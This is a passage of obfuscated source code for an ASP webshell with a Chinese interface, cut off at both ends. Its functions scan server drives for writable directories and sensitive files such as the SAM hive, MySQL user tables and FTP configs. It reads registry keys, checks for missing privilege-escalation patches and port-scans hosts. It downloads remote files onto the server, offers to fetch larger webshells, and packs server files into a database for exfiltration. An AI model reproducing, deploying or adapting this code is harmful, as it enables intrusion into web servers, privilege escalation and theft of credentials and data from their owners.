atd=fki(iuw)
if atd>ydo then ydo=atd:wzd=iuw
wjl=wzd
end function
function fki(iuw)
i=0
set F=ozf.getfolder(iuw)
for each x in f.files
if right(x.name,4)=".asp" then i=i+1
next
set f=nothing
fki=i
end function
sub lfy(iuw)
dim lni,pui
On Error Resume Next
set qqe=ozf.GetFolder(iuw)
for each objFile in qqe.Files
lni=replace(iuw&"\"&objFile.name,"\\","\")
if lni<>"" then
if sctype="1" then
if instr(1,objFile.name,xjy,1)>0 then
wcy lni,del,jfs
end if
else
if fcm(lni,xjy,3) then
wcy lni,del,jfs
end if
end if
end if
zko
next
set qqe=nothing
end sub
function fcm(cvc,etz,ghf)
On Error Resume Next
dim qlz
fcm=false
if etz="" then fcm=true
qlz=uxe
if qlz="" then qlz=sib
if right(qlz,1)<>"|" then qlz=qlz&"|"
if left(qlz,1)<>"|" then qlz="|"&qlz
if instr(1,qlz,"|"&ozf.GetExtensionName(cvc)&"|",1)>0 then
if ghf=1 or ghf=2 then
set t=khe(fxu(7))
t.Type=2
t.mode=3 
if ghf=1 then t.charset="gb2312"
if ghf=2 then t.charset="utf-8"
t.open 
t.loadfromfile cvc
bap=t.readtext
if instr(1,bap,etz,1)>0 then fcm=true
t.flush 
t.Close 
set t=nothing
else
set t=ozf.opentextfile(cvc,1,false)
if ozf.getfile(cvc).size>0 then
bap=t.readall
end if
if bap<>"" then
if instr(1,bap,etz,1)>0 then fcm=true
end if
t.close
set t=nothing
end if
end if
end function
function wcy(kho,aer,tmw)
dim mya
if right(kho,1)="\" then mya="fo" else mya="fi"
if mya="fo" then ytt kho,aer,tmw,1
if mya="fi" then qvg kho,aer,tmw
end function
sub pgv(iuw)
On Error Resume Next
if ozf.folderexists(iuw) then
set qqe=ozf.GetFolder(iuw)
for each objSubFolder in qqe.Subfolders
if objSubFolder then
yzw=replace(iuw&"\"&objSubFolder.name,"\\","\")
if right(yzw,1)<>"\" then yzw=yzw&"\"
if sctype="" then wcy yzw,del,jfs
if rhy="1" and mwf="1" then lfy(yzw):zko
if mwf="1" and instr(yzw,":") then pgv yzw:zko
end if
err.clear
zko
next 
set qqe=nothing
end if
end sub
sub cen(cez)
qnk"zol",qzx,"fileframe":njk"oej","",0:njk"wnb","",0:sdj
vux
ihv 3
ujq"'% colspan='3","<h2>"&qpe("t")&"扫描结果:</h2>"
cqo
ujq"",b("名称")
ujq"30c",b("可读")
ujq"30c",b("可写")
ity
zko
dim bac
bac=wnb
for each x in ozf.drives
if instr(wnb,"x:\")>0 then bac=bac&br&replace(wnb,"x:\",x.driveletter&":\")
next
for each xx in split(bac,br)
if cez then wcy xx,del,jfs
if rhy="1" then lfy xx
if mwf="1" then pgv xx
zko
next
vux
cqb 0
ujq"'% id='zs",""
ujq"","&nbsp;"
ity
tng"var nfo=document.getElementsByName('fo').length;var nfi=document.getElementsByName('fi').length;var total='';if(nfo!=0){total=total+'目录：'+nfo;}if(nfo!=0&nfi!=0){total=total+','}if(nfi!=0){total=total+'文件：'+nfi;}var altotal='搜索完毕,共搜到:\n'+total;if(total==''){altotal='搜索完毕\n没搜到符合条件的对象*_*'}alert(altotal);total='<b>总数: </b>'+(nfo+nfi)+'&nbsp;&nbsp;'+total;document.getElementById('zs').innerHTML=total;"
zko
end sub
function jeh()
On Error Resume Next
if uxe="" then uxe=sib
if qs="fl" then kxj=wnb
if qs="sb" then gof=wnb
if qs="xz" then amq=wnb
if amq="" then amq="http://127.0.0.1/1/text1.txt|"&oeh&"\title.asp"&br&"http://127.0.0.1/2/text2.txt|"&oeh&"\title.html"&br&"http://127.0.0.1/3/text3.txt|c:\title.bat"
if kxj="" then kxj=session("sgb")
If gof=""Then gof="HK"&jtb&"LM\SYSTEM\CurrentCo"&nhz&"ntrolSet\Control\ComputerName\ComputerName\ComputerName"
vux
cqb 3
ujq"'% colspan='2","<h2>"&qpe("t")&"检测注册表:</h2>"
ihv 4
qnk"chyy","","":njk"wnb","",kxj:njk"qs","","":njk"oej","","jeh"
ujq 60,"检 测 项:":ujq"","<textarea name=zcbx id=zcbx rows=6 style='width:724px'>"&gof&"</textarea>&nbsp;&nbsp;"&fri("botton^:qs.value='sb';wnb.value=zcbx.value;wkw('chyy')","button","Go")
ihv 3
ujq"'% colspan='2","<h2>"&qpe("t")&"下载到服务器:</h2>"
ihv 4
ujq"","下载位置:"
ujq"","<textarea name=xzsz id=xzsz rows=6 style='width:724px'>"&amq&"</textarea>&nbsp;&nbsp;"&fri("botton^:qs.value='xz';wnb.value=xzsz.value;wkw('chyy')","button","Go")
ihv 3
ujq"'% colspan='2","<h2>"&qpe("t")&"文件扫描:</h2>"
ihv 4
ujq 60,"目标目录:":ujq"",fri("chfl","text|760",kxj)
ihv 4
ujq"","关 键 字:"
ujq"",fri("xjy","text|600",xjy)&ury("sctype",0,1,1=1,0)&"文件名"&ury("sctype",0,2,1,0)&"内容 "&ury("mwf",1,1,1=1,0)&"子目录  "
ihv 4
ujq"","文件类型:"
ujq"",fri("uxe","text|677",uxe)&"&nbsp;&nbsp;"&fri("botton^:qs.value='fl';wnb.value=chfl.value;wkw('chyy')","button","开始搜索")
njk"rhy","",1:njk"del","",1:njk"jfs","",1
ity
sdj
select case qs
case"fl"
cen false
case"sb"
ycf "100%"
cqb 3
ujq"'% colspan='2","<h2>"&qpe("t")&"检测结果:</h2>"
ihv 4
ujq"70%",b("键")
ujq"30%",b("值")
ity
For Each ddd In Split(wnb,br)
lpd=fop(ddd)
if err.number=0 then
vux:cqb 1
ujq"70%",ddd
ujq"30%",lpd
ity
end if
zko
Next
ycf"100%"" style=""cursor:pointer;"" onclick=""javascript:flt('doChkReg_1')"
cqo
ujq 10,"<div style='width:10px;height:10px;' id='ss_1'>"&yez(qpe("3"))&"</div>"
ujq"100%",b("未能读取的项目")
ity
j"<div id=""doChkReg_1"" style=""display:none;"">"
For Each ddd In Split(wnb,br)
lpd=fop(ddd)
if err.number<>0 then
vux:cqb 1
ujq"100%",lpd
ity
err.clear
end if
zko
Next
j"</div>"
case"xz","zx"
qnk"zol",qzx,"fileframe":njk"oej","",0:njk"wnb","",0:sdj
vux
cqb 3
ujq"'% colspan='3","<h2>"&qpe("t")&"下载结果:</h2>"
ihv 4
ujq"40%",b("源")
ujq"30%",b("目录")
ujq"30%",b("文件")
ity
Set jby=khe(fxu(7))
Set mke=khe(fxu(9))
i=0
for each x in split(wnb,br)
ppa=split(x,"|")(0)
if ppa<>"" then
i=i+1
waa=""
waa=split(x,"|")(1)
err.clear
mke.Open"GET",ppa,False
mke.send
vux
cqb(i mod 2)
ujq"40%",ppa
If Err Then
j"<td colspan='2'><b>错误1: "&Err.Description&"错误源: "&Err.Source&"</b></td>":err.clear
else
With jby
.Type=1
.Mode=3
.Open
.Write mke.ResponseBody
.Position=0
.SavetoFile waa,2
.Close
End With
If Err Then
j"<td colspan='2'><b>错误2: "&dwe(waa)&Err.Description&"错误源: "&Err.Source&"</b></td>":err.clear
Else
jfd waa,waa
ujq"30%",jfd(waa,gbc)
ujq"30%",usx("evu",waa,waa)
End If
end if
ity
end if
zko
next
Set jby=nothing
Set mke=nothing
end select
if qs="zx" then qnk"n",qyl(waa,"\"),"":sdj:tng"n.submit()"
end function
function jqw()
On Error Resume Next
if qs="ml" then qpv=wnb
if qs="kb" then rdg=wnb
if qpv="" then qpv="x:\Program Files\MySQL\MySQL Server 5.0\my.ini"&br&"x:\Program Files\MySQL\MySQL Server 5.0\data\mysql\user.frm"&br&"x:\Program Files\MySQL\MySQL Server 5.0\COPYING"&br&"x:\Program Files\MySQL\MySQL Server 5.0\share\mysql_fix_privilege_tables.sql"&br&"x:\Program Files\MySQL\MySQL Server 4.1\bin\mysql.exe"&br&"x:\MySQL\MySQL Server 4.1\bin\mysql.exe"&br&"x:\MySQL\MySQL Server 4.1\data\mysql\user.frm"&br&"x:\Program Files\Oracle\oraconfig\Lpk.dll"&br&"x:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe"&br&"x:\WINDOWS\system32\inetsrv\w3wp.exe"&br&"x:\WINDOWS\system32\inetsrv\inetinfo.exe"&br&"x:\WINDOWS\system32\inetsrv\MetaBase.xml"&br&"x:\WINDOWS\system32\inetsrv\iisadmpwd\achg.asp"&br&"x:\WINDOWS\system32\config\default.LOG"&br&"x:\WINDOWS\system32\config\sam"&br&"x:\WINDOWS\system32\config\system"&br&"x:\CMailServer\config.ini"&br&"x:\program files\CMailServer\config.ini"&br&"x:\tomcat6\tomcat6\bin\version.sh"&br&"x:\tomcat6\bin\version.sh"&br&"x:\tomcat\bin\version.sh"&br&"x:\program files\tomcat6\bin\version.sh"&br&"x:\Program Files\Apache Software Foundation\Tomcat 6.0\bin\version.sh"&br&"x:\Program Files\Apache Software Foundation\Tomcat 6.0\logs\isapi_redirect.log"&br&"x:\Apache2\Apache2\bin\Apache.exe"&br&"x:\Apache2\bin\Apache.exe"&br&"x:\Apache2\php\license.txt"&br&"x:\Program Files\Apache Group\Apache2\bin\Apache.exe"&br&"x:\windows\php.ini"&br&"x:\boot.ini"&br&"x:\1.txt"&br&"x:\a.txt"&br&"x:\CMailServer\config.ini"&br&"x:\CMailServer\CMailServer.exe"&br&"x:\CMailServer\WebMail\index.asp"&br&"x:\program files\CMailServer\CMailServer.exe"&br&"x:\program files\CMailServer\WebMail\index.asp"&br&"x:\WinWebMail\SysInfo.ini"&br&"x:\WinWebMail\Web\default.asp"&br&"x:\WinWebMail\"&br&"x:\WINDOWS\FreeHost32.dll"&br&"x:\WINDOWS\7i24iislog4.exe"&br&"x:\WINDOWS\7i24tool.exe"&br&"x:\hzhost\databases\url.asp"&br&"x:\hzhost\hzclient.exe"&br&"x:\Documents and Settings\All Users\「开始」菜单\程序\7i24虚拟主机管理平台\自动设置[受控端].lnk"&br&"x:\Documents and Settings\All Users\「开始」菜单\程序\PremiumSoft\"&br&"x:\manager\HostManagerService\"&br&"x:\rar\"&br&"x:\StatisticsClient\analog6\analyzeres\"&br&"x:\Program Files\SogouInput\"&br&"x:\imail\"&br&"x:\hzhost\hzhost_conpanel\"&br&"x:\ftproot\"&br&"x:\Config.Msi\"&br&"x:\PerfLogs\"&br&"x:\ProgramData\"&br&"x:\upload\"&br&"x:\MySQL\data\mysql\user.MYD"&br&"x:\SOFT_PHP_PACKAGE\"&br&"x:\SERVERS\"&br&"x:\ZkeysSoft\"&br&"x:\wwwroot1\"&br&"x:\TDdownload\"&br&"x:\FreeHostMain\"&br&"x:\Downloads\"&br&"x:\华众\"&br&"x:\index\"&br&"x:\php\uploadtemp\"&br&"x:\WORK\"&br&"x:\Perl\html\"&br&"x:\hzhost\hzhost_master\"&br&"x:\SOFT_PHP_PACKAGE\"&br&"x:\CV5\"&br&"x:\桌面\"&br&"x:\Program Files\Common Files\Thunder Network\"&br&"x:\Program Files\Common Files\Borland Shared\BDE\"&br&"x:\Documents and Settings\All Users\Application Data\Kaspersky Lab\"&br&"x:\Documents and Settings\All Users\Application Data\McAfee\"&br&"x:\7i24.com\Serverdoctor\log\"&br&"x:\DBbackup\"&br&"x:\Oracle\"&br&"x:\VhostManage\DataBase\site.mdb"&br&"x:\8uftp\"&br&"x:\MailLog\"&br&"x:\phpMyAdmin-4.0.2\"&br&"x:\ZkeysSoft\Zend\ZendOptimizer-3.3.3\"&br&"x:\Program Files\Thunder Network\Thunder7\"&br&"x:\Program Files\Thunder Network\Thunder\"&br&"x:\windows\DriverPacks\C\AM2\"&br&"x:\Program Files\FlashFXP\"&br&"x:\freehost\zhoudeyang\web\Prim@Hosting\"&br&"x:\hosting\wwwroot\vhostroot\"&br&"x:\Vhost\WebRoot\51dancecn\vhostroot\"&br&"x:\vhostroot\localuser\"&br&"x:\vhostroot\LocalUser\gdrt\"&br&"x:\virtualhost\web580651\www\"&br&"x:\wwwroot\longzhihu\wwwroot\"&br&"x:\host\wz8088\web\"&br&"x:\usr\fw04408\xpinfo\ "&br&"x:\Program Files\Tencent\qq\"&br&"x:\Vhost\"&br&"x:\serv-u\"&br&"x:\freehostbackup\"&br&"x:\freehostbackup\sqlbackup\"&br&"x:\bak\"&br&"x:\tools\"&br&"x:\Drive_D\"&br&"x:\ADFS\"&br&"x:\newb\"&br&"x:\i386\"&br&"x:\webback\"&br&"x:\temp\"&br&"x:\BadMail\"&br&"x:\LogFiles\"&br&"x:\客户端\"&br&"x:\Intel\"&br&"x:\RavBin\"&br&"x:\drivers\"&br&"x:\program files\Tencent\"&br&"x:\iiscompression\"&br&"x:\Scripts\"&br&"x:\Windows Mail\"&br&"x:\ihosting\"&br&"x:\mssql\"&br&"x:\perflogs\"&br&"x:\serv\"&br&"x:\dosh\"&br&"x:\Program Files\NpointSoft\"&br&"x:\替换程序\"&br&"x:\ftp\"&br&"x:\beifen\"&br&"x:\autorun.inf"&br&"x:\support\"&br&"x:\ZendOptimizer-3.3.3\"&br&"x:\复件 Serv-u\"&br&"x:\复件 HZHost\"&br&"x:\server_core\"&br&"x:\新建文件夹\"&br&"x:\新建文件夹 (1)\"&br&"x:\新建文件夹 (2)\"&br&"x:\Imail\"&br&"x:\tools\flashftp\"&br&"x:\tools\ftp2\"&br&"x:\Rewrite\Rewrite.dll"&br&"x:\FTP软件\"&br&"x:\ISAPI_Rewrite3\"&br&"x:\IMail\"&br&"x:\com\"&br&"x:\Program Files\FlashFXP\"&br&"x:\FlashFXP\"&br&"x:\Program Files\EditPlus\"&br&"x:\Program Files\EditPlus 2"&br&"x:\inetpub\temp\appPools\"&br&"x:\inetpub\temp\"&br&"x:\zzyhost\apache2\bin\"&br&"x:\zzyhost\additional\php\"&br&"x:\7i24.com\Serverdoctor\"&br&"x:\7i24.com\LicenseServerDoctor\"&br&"x:\MySQL Server\Docs\"&br&"x:\Documents and Settings\All Users\Start Menu\"&br&"x:\sqldata\"&br&"x:\software\"&br&"x:\程序\"&br&"x:\123\"&br&"x:\MySQL\"&br&"x:\website\"&br&"x:\IISLogFiles\"&br&"x:\NpointSoft\"&br&"x:\nav\Navicat for MySQL\"&br&"x:\Program Files (x86)\"&br&"x:\li\"&br&"x:\love\"&br&"x:\backdate\"&br&"x:\文本替换专家\"&br&"x:\ftp.rar"&br&"x:\wwwroot.rar"&br&"x:\新建 文本文档.txt"&br&"x:\data\"&br&"x:\vhostroot\"&br&"x:\Program Files\Gene6 FTP Server\RemoteAdmin\Remote.ini"&br&"x:\Recovery\"&br&"x:\bak.rar"&br&"x:\Program Files\SogouWBInput\"&br&"x:\inetpub\wwwroot\"&br&"x:\program files\服务器助手\"&br&"x:\Program Files\LuDaShi\"&br&"x:\360Rec\"&br&"x:\Documents and Settings\All Users\Start Menu\"&br&"x:\Documents and Settings\All Users\Start Menu\Programs\"&br&"x:\$RECYCLE.BIN\"&br&"x:\Program Files\Zend\ZendOptimizer-3.3.0\lib\ZendExtensionManager.dll"&br&"x:\webwww\"&br&"x:\iislog\"&br&"x:\Program Files\QQ2007\qq.exe "
toq="KB952004@MS09-012"&br&"KB956572@MS09-012"&br&"KB2393802@MS11-011"&br&"KB2592799@MS11-080"&br&"KB2621440@MS12-0203"&br&"KB2160329@MS10-048"&br&"KB970483@MS09-020"&br&"KB2124261@MS10-065"&br&"KB2271195@MS10-065"&br&"KB977165@MS10-015"&br&"KB2360937@MS10-084"&br&"KB2478960@MS11-014"&br&"KB2507938@MS11-056"&br&"KB2566454@MS11-062"&br&"KB2646524@MS12-003"&br&"KB2645640@MS12-009"&br&"KB2641653@MS12-018"&br&"KB944653@MS07-067"&br&"KB952004@MS09-012"&br&"KB971657@MS09-041"&br&"KB2620712@MS11-097"&br&"KB942831@MS08-005"&br&"KB2503665@MS11-046"&br&"KB2592799@MS11-080"&br&""
if rdg="" then rdg=toq
vux
cqb 3
ujq"'% colspan='2","<h2>"&qpe("t")&"目录扫描:</h2>"
cqb 4
ujq 60,"目录文件:":ujq"","<textarea name=chml id=chml rows=8 style='width:760px;'>"&qpv&"</textarea>"&"<li style='margin-top:5px;'>"&dwe("目录扫描 请在结尾输入 \ 否则视为文件,文件扫描请输出文件绝对路径和文件全名称")&"<li>"&dwe("盘符设置为x,则循环扫描各物理磁盘")
qnk"chxx","","":njk"wnb","",iuw:njk"qs","","":njk"oej","","jqw":njk"lsw","","post":njk"xnf","","post"
ihv 4
ujq"","搜索范围:"
ujq"",ury("mwf",1,1,1,0)&"子目录  "&ury("rhy",1,1,1,0)&"包含文件  "&ury("del",1,1,1=1,0)&"显示不可读对象  "&ury("jfs",1,1,1=1,0)&"显示不可写对象  "&fri("botton^:qs.value='ml';wnb.value=chml.value;wkw('chxx')","button","开始搜索")
ihv 3
ujq"'% colspan='2","<h2>"&qpe("t")&"补丁检测:</h2>"
ihv 4
ujq"","补丁列表:"
ujq"","<textarea name=rdg id=rdg rows=6 style='width:676px;'>"&rdg&"</textarea>&nbsp;&nbsp;"&fri("botton^:qs.value='kb';wnb.value=rdg.value;wkw('chxx')","button","开始搜索")
ihv 3
ujq"'% colspan='2","<h2>"&qpe("t")&"端口扫描:</h2>"
ihv 4
ujq"","IP:"
ujq"",fri("lsw1","text|760","127.0.0.1")
ihv 4
ujq"","Port:"
ujq"",fri("xnf1","text|713","21,23,80,1433,1521,3306,3389,4899,8080,43"&yen&"958,65500")&"&nbsp;&nbsp;"&fri("botton^:qs.value='dk';wkw('chxx')","button","扫描")
sdj
ity
select case qs
case"ml"
cen true
case"kb"
for each y in split(wnb,br)
if y<>"" then
if not ozf.fileexists("c:\windows\"&split(y,"@")(0)&".log") and y<>"" then eoj=eoj&replace(y,"@","...")&"...补丁不存在<br>"
end if
next
vux
ihv 3
ujq"","<h2>"&qpe("t")&"检测结果:</h2>"
cqo
ujq"",eoj
ity
case"dk"
If Not wle(lsw,"^((\d{1,3}\.){3}(\d{1,3}),)*(\d{1,3}\.){3}(\d{1,3})$")Then
j"IP格式不符"
End If
If Not wle(xnf,"^(\d{1,5},)*\d{1,5}$")Then
j"端口格式不符"
End If
j"搜索ing...<br>"
zko
For Each lat In Split(lsw,",")
For Each slg In Split(xnf,",")
ucs lat,slg
Next
Next
end select
end function
Sub ucs(bgu,ves)
On Error Resume Next
Dim jgb,meq
Set jgb=khe(fxu(12))
meq="Provider=SQLOLEDB.1;Data Source="&bgu&","&ves&";User ID=lake2;Password=lake2;"
jgb.ConnectionTimeout=1
jgb.open meq
If Err Then
If Err.number=-2147217843 or Err.number=-2147467259 Then
If InStr(Err.description,"(Connect()).")>0 Then
j"<label>"&bgu&":"&ves&"</label>&nbsp;<label> close</label><br>"
Else
j"<label>"&bgu&":"&ves&"</label>&nbsp;<label>"&dwe(" open")&"</font></label><br>"
End If
zko
End If
End If
End Sub
Function ytt(rrs,aer,tmw,bnq)
On Error Resume Next
i=1
ytt=0
dim uuu,eyq,spk,jwg
uuu=1
xcn=rrs&ozf.GettempName
Set f=ozf.GetFolder(rrs)
if bnq=0 then
if err.number=0 then ytt=1
err.clear
exit function
end if
if err then
eyq=vrc
if aer=0 then uuu=0
ytt=1
else
eyq=pzk
end if
err.clear
ozf.CreateTextFile(xcn)
if err then
spk=vrc
if tmw=0 then uuu=0
else
spk=pzk
end if
ozf.DeleteFile(xcn)
err.clear
jwg=qpe(0)&afo(rrs,dwe(rrs))
if ygv then i=0:jwg=qpe(0)&afo(rrs,rrs)
if uuu=1 and (ygv or ozf.folderexists(rrs)) then 
vux
cqb i
j qjr("fo",1)
ujq"",jwg
ujq"30c",eyq
ujq"30c",spk
ity
end if
end Function
function qvg(inl,aer,tmw)
On Error Resume Next
dim jdh,nvl,qza
jdh=1
if clng(ozf.GetFile(inl).size/1024)<1024 then
set getAtt=khe(fxu(7))
getAtt.Type=2
getAtt.mode=3 
getAtt.open
getAtt.loadfromfile(inl)
getAtt.readtext
else
sdflj
end if
if err then
nvl=vrc
if aer=0 then jdh=0
else
nvl=pzk
end if
getAtt.Close 
set getAtt=Nothing
err.clear
set getAtt=ozf.GetFile(inl)
getAtt.Attributes=getAtt.Attributes
if err then
qza=vrc
if tmw=0 then jdh=0
else
qza=pzk
end if
err.clear
qvg=Err.Number 
set getAtt=Nothing  
if jdh=1 and ozf.FileExists(inl) then 
vux
cqb 1
j qjr("fi",2)
dim dif
dif=mid(inl,instr(1,inl,xjy,1),len(xjy))
ujq"",qpe(LCase(qyl(inl,".")))&usx("evu",inl,replace(inl,xjy,dwe(dif),1,-1,1))
ujq"30c",nvl
ujq"30c",qza
ity
end if
end function
function llb()
On Error Resume Next
dim mty
mty=split("php,aspx,pl",",")
kdk=split(dbx,",")
qnk"ob",qzx,""
njk"oej","","vov"
njk"jss","",""
'vux
ycf"1024px"" align=""center"" height=""100%"
cqb 4
if jss="de" then
for each f in mty
ozf.DeleteFile(server.mappath("test."&f))
next
ujq"'% colspan='3' height='100'c","删除完毕!"
else
ozf.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo 'oo∩_∩oo'?><?php phpinfo()?>"
ozf.CreateTextFile(server.mappath("test.aspx")).Write""&chr(60)&"%@ Page Language=""VB"""&chr(37)&""&chr(62)&""&chr(60)&""&chr(37)&"=""aspx Test oo∩_∩oo"""&chr(37)&""&chr(62)
ozf.CreateTextFile(server.mappath("test.pl")).Write"#!/usr/bin/perl"&vbCrLf&"print ""perl Test oo∩_∩oo"";"
for each x in mty
ujq"c","<iframe src=test."&x&" width=300 height=100></iframe>"
next
end if
sdj
qnk"chyy",qzx,"":njk"wnb","","":njk"qs","","":njk"oej","","jeh"
ihv 4
i=0
for each x in mty
ujq"c",fri("botton^:wnb.value='"&lyx(kdk(i)&"|"&Server.MapPath("test."&x))&"';qs.value='zx';wkw('chyy')","button","下载"&x&"大"&"马"):i=i+1
next
sdj
ihv 4:ujq"'% colspan='3'c",fri("^:yjr('jss').value='de';wkw('ob')","button","删除测试文件")
ihv 4
ujq"'% colspan='3' height='100%'c","<iframe src='http://cn.bing.com/search?q=ip:"&jmc&" aspx' width='1024px' height='100%' frameborder='1' scrolling='yes'></iframe>"
ity
End function
function vyq()
On Error Resume Next
qnk"zol",qzx,"fileframe":njk"oej","",0:njk"wnb","",0:sdj
Dim jiy(6,2)
jiy(0,1)="c:\windows\system"&gbp&"32\sethc.exe"
jiy(0,2)="shi"&"ft后"&"门"
jiy(1,1)="c:\windows\system"&gbp&"32\dllcache\sethc.exe"
jiy(1,2)=jiy(0,2)
jiy(2,1)="c:\windows\system"&gbp&"32\magnify.exe"
jiy(2,2)="放大"&"镜后"&"门"
jiy(3,1)="c:\windows\system"&gbp&"32\dllcache\magnify.exe"
jiy(3,2)=jiy(2,2)
jiy(4,1)="c:\windows\my.ini"
jiy(4,2)="mysql数据库配置文件"
jiy(5,1)="C:\Documents and Settings\All Users\「开始」菜单\程序\Gene6 FTP Server.lnk"
jiy(5,2)="Gene6 FTP"
mrn"服务器后门检测",4,1
vux
cqb 4
ujq"",yez(b("后门种类"))
ujq"",yez(b("文件名"))
ujq"80",yez(b("大小"))
ujq"30c",yez(b("属性"))
ujq"150c",yez(b("最后修改时间"))
ujq"150c",yez(b("创建时间"))
ujq"150c",yez(b("最后访问时间"))
for i=0 to 5
set f=ozf.getfile(jiy(i,1))
if err.number=0 then
ihv 0
ujq"",jiy(i,2)
ujq"",usx("yzx",jiy(i,1),jiy(i,1))
ujq"",f.size/1024&" k"
ujq"c",f.Attributes
ujq"c",f.DateLastModified
ujq"c",f.DateCreated
ujq"c",f.DateLastAccessed
end if
set f=nothing
err.clear
next
ity
end function
function psx()
On Error Resume Next
dim cfx,aqi,sad
if session("cfx")="" then session("cfx")=kcm
qnk"zol",qzx,"_blank":njk"oej","",0:njk"wnb","",0:sdj
tng"function d(id){var o=document.getElementById(id);if(o.style.display==''){o.style.display='none';}else{o.style.display='';}}"
ygv=true
vux
cqb 3
ujq"","<div id=z style='font-size:20px;'></div>"
ity
'j"<div id=z style='font-size:20px;'></div>"
krt
ity
dim vsb
sad=3
f=0
vsb=false
ufw
mrn"危险目录检测",2,1
vux
cqb 4:j"<td width='50%'>"
ycf"100%"
cqb 4
ujq"",yez(b("目录名称"))
ujq 30,yez(b("可读"))
ujq 30,yez(b("可写"))
ity
for each x in ozf.drives
if ytt(x&"\",1,1,1)=0 then
if x=split(oeh,"\")(0) then
end if
f=f+1
else
if x=split(oeh,"\")(0) then
vsb=true
end if
end if
ytj=ytj&","&x&"\recycler"
next
if f>0 then sad=sad-1
cfx="有 "&dwe(f)&" 个磁盘根目录可以访问！<br>":f=1
e=ubound(split(oeh,"\"))
if vsb then
for a=0 to e
d=""
for c=0 to e-a
d=d&split(oeh,"\")(c)&"\"
next
if ytt(d,1,1,0)=0 and f<a then f=a
next
cfx=cfx&"web根目录以上 "&dwe(f-1)&" 级目录可读；如大于3级，服务器则有可能存在跨站跨目录漏洞！"
else
cfx=cfx&"web根目录所在磁盘根目录 "&dwe(split(oeh,"\")(0))&" 可以访问!"
end if
j"</td>"
ujq"",cfx
ity
ity
if mpi then sad=sad-1
select case sad
case 1:sad="低"
case 2:sad="中"
case 3:sad="高"
end select
tng"z.innerHTML='服务器安全指数:"&dwe(sad)&"&nbsp;&nbsp;&nbsp;&nbsp;"&session("cfx")&"';"
mrn"常用组件检测",1,1
vux
cqb 4
'qnk"ob",qzx,""
'j xqk("wnb")
'njk"oej","","psx" '"zzckobj"
'njk"wnb","",""
ujq"'% colspan='2",fri("wnb1","text|300",wnb)&"&nbsp;"&fri("^:document.getElementById('zol').target='';tas('psx',wnb1.value)","button","检测")&"&nbsp;&nbsp;&nbsp;"&iif(wnb<>"",wnb&iif(cav(wnb),pzk,vrc),"")
'sdj
for i=0 to 10
ihv 0
ujq"50%",iif(cav(fxu(i)),pzk,vrc)&fxu(i)
ujq"50%",iif(cav(fxu(i+11)),pzk,vrc)&fxu(i+11)
if cav(fxu(i)) then f=f+1
next
cfx="存在 "&dwe(f)&" 个高危组件！"
f=0:ity
tng"y1.innerHTML='　　"&cfx&"';"
ity
vyq:jkj
end function
end class
Class UUPC
Dim D1,D2
Public function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
End Function
Public function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FFIF:end if
End Function
Private Sub Class_Initialize
Dim TDa,TSt,vbCrlf,TIn,ooo,T2,nwi,TFL,SFV,alf,cli,sci,dof,zhi
set D1=khe(fxu(11))
if Request.TotalBytes<1 then Exit Sub
set T1=khe(fxu(7))
T1.Type=1:T1.Mode=3 : T1.Open
T1.Write Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa=T1.Read : sci=1
dof=LenB(TDa)
set D2=khe(fxu(11))
vbCrlf=chrB(13) & chrB(10)
set T2=khe(fxu(7))
TSt=MidB(TDa,1,InStrB(sci,TDa,vbCrlf)-1)
nwi=LenB (TSt)
sci=sci+nwi+1
while (sci + 10) < dof
ooo=InStrB(sci,TDa,vbCrlf & vbCrlf)+3
T2.Type=1 : T2.Mode=3 : T2.Open
T1.Position=sci
T1.CopyTo T2,ooo-sci
T2.Position=0 : T2.Type=2 : T2.Charset="gb2312"
TIn=T2.ReadText : T2.Close
sci=InStrB(ooo,TDa,TSt)
alf=InStr(22,TIn,"name=""",1)+6
cli=InStr(alf,TIn,"""",1)
zhi=lcase(Mid (TIn,alf,cli-alf))
if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FFIF
alf=InStr(cli,TIn,"filename=""",1)+10
cli=InStr(alf,TIn,"""",1)
alf=InStr(cli,TIn,"Content-Type: ",1)+14
cli=InStr(alf,TIn,vbCr)
TFL.mou=ooo
TFL.qoi=sci -ooo -3
if not D2.Exists(zhi) then
D2.add zhi,TFL
end if
else
T2.Type=1 : T2.Mode=3 : T2.Open
T1.Position=ooo : T1.CopyTo T2,sci-ooo-3
T2.Position=0 : T2.Type=2
T2.Charset="gb2312"
SFV=T2.ReadText
T2.Close
if D1.Exists(zhi) then
D1(zhi)=D1(zhi)&", "&SFV
else
D1.Add zhi,SFV
end if
end if
sci=sci+nwi+1
wend
TDa=""
set T2=nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
D1.RemoveAll:D2.RemoveAll
set D1=nothing:set D2=nothing
T1.Close
set T1=nothing
end if
End Sub
End Class
Class FFIF
dim qoi,mou
Private Sub Class_Initialize
qoi=0
mou=0
End Sub
Public function tbp(F)
dim T3
tbp=true
if trim(F)="" or mou=0 then exit function
set T3=khe(fxu(7))
T3.Mode=3 : T3.Type=1 : T3.Open
T1.position=mou
T1.copyto T3,qoi
T3.SaveToFile F,2
T3.Close
set T3=nothing
tbp=false
end function
End Class
Sub kar(ucf,ddd,rs,jby)
On Error Resume Next
Dim fzh,wcx
dih
tht=Lcase(tht)
Set wcx=ozf.GetFolder(ddd)
If Err Then ixt Err
For Each fzh In wcx.Files
If Not(wle(qyl(fzh.name,"."),"^("&xut&")$") Or Lcase(fzh.Name)=umj Or Lcase(fzh.Name)=mdbName2)Then
rs.AddNew
rs("binPath")=Replace(fzh.Path,ucf,"")
jby.LoadFromFile(fzh.Path)
rs("binContent")=jby.Read()
rs.Update
j fzh.Path&" ...... "
j iif(err>0,vrc&" ...... "&Err.Description,pzk)
j"<br>"
err.clear
zko
End If
Next
For Each fzh In wcx.SubFolders
If Not wle(fzh.name,"^("&tht&")$")Then
kar ucf,fzh.Path,rs,jby
End If
Next
set ozf=Nothing
Set wcx=Nothing
End Sub
Sub kud()
On Error Resume Next
Server.ScriptTimeOut=5000
ucf=session("sgb")
dih
wgb=Server.MapPath(ozf.GetTempName&".mdb")
Dim rs,meq,wuz
Set rs=khe(fxu(15))
Set jby=khe(fxu(7))
Set wuz=khe(fxu(13))
umj=qyl(wgb,"\")
